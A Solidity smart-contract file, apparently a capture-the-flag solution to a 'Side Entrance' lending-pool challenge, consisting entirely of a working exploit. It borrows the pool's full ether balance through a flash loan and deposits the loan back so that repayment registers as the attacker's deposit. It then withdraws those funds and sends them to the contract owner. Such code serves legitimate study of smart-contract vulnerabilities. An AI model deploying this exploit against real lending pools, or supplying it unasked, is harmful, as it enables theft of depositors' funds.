// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LendingPoolAble {
    address internal immutable flashLoanPool;

    constructor(address _flashLoanPool) {
        flashLoanPool = _flashLoanPool;
    }

    modifier onlyLP() {
        require(
            msg.sender == flashLoanPool,
            "LENDING_POOL_CALLED: Execute not called by pool"
        );
        _;
    }
}

contract ExploitSideEntrance is LendingPoolAble, Ownable {
    using Address for address;
    using Address for address payable;

    constructor(address _flashLoanPool) LendingPoolAble(_flashLoanPool) {}

    function executeExploit() public onlyOwner {
        flashLoanPool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", flashLoanPool.balance)
        );

        payday();
    }

    // Called by flashloan contract
    function execute() external payable onlyLP {
        flashLoanPool.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
    }

    function payday() private {
        flashLoanPool.functionCall(abi.encodeWithSignature("withdraw()"));
        payable(owner()).sendValue(address(this).balance);
    }

    receive() external payable {}
}
